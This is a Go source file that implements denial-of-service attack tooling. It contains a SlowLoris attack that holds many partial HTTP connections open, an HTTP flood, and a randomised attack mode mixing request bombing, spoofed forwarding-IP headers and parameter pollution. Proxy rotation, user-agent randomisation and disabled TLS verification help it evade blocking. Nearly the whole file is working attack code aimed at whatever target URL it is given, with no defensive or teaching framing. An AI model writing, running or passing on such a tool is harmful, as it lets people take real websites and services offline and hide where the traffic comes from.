package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

// SlowLoris Attack Implementation
type SlowLorisAttack struct {
	target      string
	port        string
	connections []net.Conn
	mu          sync.Mutex
	active      bool
}

func NewSlowLorisAttack(target string) *SlowLorisAttack {
	u, _ := url.Parse(target)
	port := "80"
	if u.Scheme == "https" {
		port = "443"
	}
	if u.Port() != "" {
		port = u.Port()
	}

	return &SlowLorisAttack{
		target:      u.Hostname(),
		port:        port,
		connections: make([]net.Conn, 0),
		active:      true,
	}
}

func (sla *SlowLorisAttack) Start(numConnections int) {
	fmt.Printf("Starting SlowLoris attack on %s:%s with %d connections\n",
		sla.target, sla.port, numConnections)

	var wg sync.WaitGroup

	for i := 0; i < numConnections; i++ {
		wg.Add(1)
		go func(connID int) {
			defer wg.Done()
			sla.maintainConnection(connID)
		}(i)

		// Delay between connections
		time.Sleep(time.Millisecond * 100)
	}

	wg.Wait()
}

func (sla *SlowLorisAttack) maintainConnection(connID int) {
	conn, err := net.Dial("tcp", sla.target+":"+sla.port)
	if err != nil {
		return
	}

	defer conn.Close()

	// Add to active connections
	sla.mu.Lock()
	sla.connections = append(sla.connections, conn)
	sla.mu.Unlock()

	// Send initial request
	request := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\n", sla.target)
	conn.Write([]byte(request))

	// Keep connection alive with partial headers
	for sla.active {
		// Send partial header
		partialHeader := fmt.Sprintf("X-a%d: b\r\n", rand.Intn(1000))
		conn.Write([]byte(partialHeader))

		// Wait before sending next partial header
		time.Sleep(time.Second * 10)
	}
}

func (sla *SlowLorisAttack) Stop() {
	sla.active = false
	sla.mu.Lock()
	defer sla.mu.Unlock()

	for _, conn := range sla.connections {
		conn.Close()
	}
	sla.connections = nil
}

// HTTP Flood Attack Implementation
type HTTPFloodAttack struct {
	target   string
	client   *http.Client
	payloads []string
	mu       sync.Mutex
}

func NewHTTPFloodAttack(target string) *HTTPFloodAttack {
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 100,
			IdleConnTimeout:     90 * time.Second,
		},
	}

	payloads := []string{
		strings.Repeat("A", 1000),   // Small payload
		strings.Repeat("B", 10000),  // Medium payload
		strings.Repeat("C", 100000), // Large payload
		"<?xml version='1.0'?><test>data</test>",
		"{\"key\":\"" + strings.Repeat("value", 100) + "\"}",
	}

	return &HTTPFloodAttack{
		target:   target,
		client:   client,
		payloads: payloads,
	}
}

func (hfa *HTTPFloodAttack) Start(numWorkers int, duration time.Duration) {
	fmt.Printf("Starting HTTP Flood attack on %s with %d workers for %v\n",
		hfa.target, numWorkers, duration)

	var wg sync.WaitGroup
	stopChan := make(chan bool)

	// Start workers
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			hfa.worker(workerID, stopChan)
		}(i)
	}

	// Stop after duration
	time.AfterFunc(duration, func() {
		close(stopChan)
	})

	wg.Wait()
	fmt.Println("HTTP Flood attack completed")
}

func (hfa *HTTPFloodAttack) worker(workerID int, stopChan chan bool) {
	methods := []string{"GET", "POST", "HEAD", "PUT", "DELETE"}

	for {
		select {
		case <-stopChan:
			return
		default:
			method := methods[rand.Intn(len(methods))]
			payload := hfa.payloads[rand.Intn(len(hfa.payloads))]

			hfa.sendRequest(method, payload)

			// Small delay to prevent overwhelming
			time.Sleep(time.Millisecond * 10)
		}
	}
}

func (hfa *HTTPFloodAttack) sendRequest(method, payload string) {
	var req *http.Request
	var err error

	if method == "GET" {
		req, err = http.NewRequest(method, hfa.target, nil)
	} else {
		req, err = http.NewRequest(method, hfa.target, strings.NewReader(payload))
	}

	if err != nil {
		return
	}

	// Set headers
	req.Header.Set("User-Agent", getRandomUserAgentAdvanced())
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")

	resp, err := hfa.client.Do(req)
	if err != nil {
		return
	}

	if resp != nil {
		resp.Body.Close()
	}
}

// Random Attack Pattern Implementation
type RandomAttack struct {
	target  string
	attacks []AttackMethod
	mu      sync.Mutex
}

type AttackMethod struct {
	name     string
	function func()
	weight   int
}

func NewRandomAttack(target string) *RandomAttack {
	ra := &RandomAttack{
		target:  target,
		attacks: make([]AttackMethod, 0),
	}

	// Add different attack methods with weights
	ra.attacks = append(ra.attacks, AttackMethod{
		name:   "HTTP Flood",
		weight: 30,
		function: func() {
			hfa := NewHTTPFloodAttack(target)
			hfa.Start(10, time.Second*30)
		},
	})

	ra.attacks = append(ra.attacks, AttackMethod{
		name:   "SlowLoris",
		weight: 20,
		function: func() {
			sla := NewSlowLorisAttack(target)
			sla.Start(50)
			time.Sleep(time.Second * 30)
			sla.Stop()
		},
	})

	ra.attacks = append(ra.attacks, AttackMethod{
		name:   "Request Bombing",
		weight: 25,
		function: func() {
			ra.requestBombing()
		},
	})

	ra.attacks = append(ra.attacks, AttackMethod{
		name:   "Header Manipulation",
		weight: 15,
		function: func() {
			ra.headerManipulation()
		},
	})

	ra.attacks = append(ra.attacks, AttackMethod{
		name:   "Parameter Pollution",
		weight: 10,
		function: func() {
			ra.parameterPollution()
		},
	})

	return ra
}

func (ra *RandomAttack) Start(duration time.Duration) {
	fmt.Printf("Starting Random Attack on %s for %v\n", ra.target, duration)

	stopChan := make(chan bool)

	// Start random attack pattern
	go func() {
		for {
			select {
			case <-stopChan:
				return
			default:
				ra.executeRandomAttack()
				time.Sleep(time.Second * 5)
			}
		}
	}()

	// Stop after duration
	time.AfterFunc(duration, func() {
		close(stopChan)
	})

	<-stopChan
	fmt.Println("Random Attack completed")
}

func (ra *RandomAttack) executeRandomAttack() {
	// Select attack based on weights
	totalWeight := 0
	for _, attack := range ra.attacks {
		totalWeight += attack.weight
	}

	random := rand.Intn(totalWeight)
	currentWeight := 0

	for _, attack := range ra.attacks {
		currentWeight += attack.weight
		if random < currentWeight {
			fmt.Printf("Executing: %s\n", attack.name)
			attack.function()
			return
		}
	}
}

func (ra *RandomAttack) requestBombing() {
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	// Send many small requests rapidly
	for i := 0; i < 100; i++ {
		go func() {
			req, _ := http.NewRequest("GET", ra.target, nil)
			req.Header.Set("User-Agent", getRandomUserAgentAdvanced())
			client.Do(req)
		}()
	}
}

func (ra *RandomAttack) headerManipulation() {
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	maliciousHeaders := []string{
		"X-Forwarded-For: 127.0.0.1",
		"X-Real-IP: 192.168.1.1",
		"X-Originating-IP: 10.0.0.1",
		"X-Remote-IP: 172.16.0.1",
		"X-Remote-Addr: 8.8.8.8",
	}

	for _, header := range maliciousHeaders {
		go func(h string) {
			req, _ := http.NewRequest("GET", ra.target, nil)
			parts := strings.Split(h, ": ")
			if len(parts) == 2 {
				req.Header.Set(parts[0], parts[1])
			}
			client.Do(req)
		}(header)
	}
}

func (ra *RandomAttack) parameterPollution() {
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	// Send requests with duplicate parameters
	params := []string{
		"id=1&id=2&id=3",
		"user=admin&user=guest&user=test",
		"action=read&action=write&action=delete",
	}

	for _, param := range params {
		go func(p string) {
			url := ra.target + "?" + p
			req, _ := http.NewRequest("GET", url, nil)
			client.Do(req)
		}(param)
	}
}

// Proxy Support Implementation
type ProxyManager struct {
	proxies []string
	current int
	mu      sync.Mutex
}

func NewProxyManager(proxyFile string) (*ProxyManager, error) {
	file, err := openFile(proxyFile)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" {
			proxies = append(proxies, proxy)
		}
	}

	return &ProxyManager{
		proxies: proxies,
		current: 0,
	}, nil
}

func (pm *ProxyManager) GetNextProxy() string {
	pm.mu.Lock()
	defer pm.mu.Unlock()

	if len(pm.proxies) == 0 {
		return ""
	}

	proxy := pm.proxies[pm.current]
	pm.current = (pm.current + 1) % len(pm.proxies)
	return proxy
}

func (pm *ProxyManager) CreateProxyClient(proxy string) *http.Client {
	if proxy == "" {
		return &http.Client{
			Timeout: 30 * time.Second,
		}
	}

	proxyURL, err := url.Parse(proxy)
	if err != nil {
		return &http.Client{
			Timeout: 30 * time.Second,
		}
	}

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	return &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}
}

// Rate Limiter Implementation
type RateLimiter struct {
	rate  time.Duration
	token chan struct{}
	stop  chan bool
}

func NewRateLimiter(requestsPerSecond int) *RateLimiter {
	if requestsPerSecond <= 0 {
		return nil
	}

	rl := &RateLimiter{
		rate:  time.Second / time.Duration(requestsPerSecond),
		token: make(chan struct{}, requestsPerSecond),
		stop:  make(chan bool),
	}

	// Fill token bucket
	for i := 0; i < requestsPerSecond; i++ {
		rl.token <- struct{}{}
	}

	// Start token refill
	go rl.refill()

	return rl
}

func (rl *RateLimiter) refill() {
	ticker := time.NewTicker(rl.rate)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			select {
			case rl.token <- struct{}{}:
			default:
			}
		case <-rl.stop:
			return
		}
	}
}

func (rl *RateLimiter) Wait() {
	if rl == nil {
		return
	}
	<-rl.token
}

func (rl *RateLimiter) Stop() {
	if rl != nil {
		close(rl.stop)
	}
}

// Utility functions
func getRandomUserAgentAdvanced() string {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6) AppleWebKit/605.1.15",
		"Mozilla/5.0 (Android 11; Mobile) Gecko/89.0 Firefox/89.0",
	}
	return userAgents[rand.Intn(len(userAgents))]
}

func openFile(filename string) (*os.File, error) {
	return os.Open(filename)
}
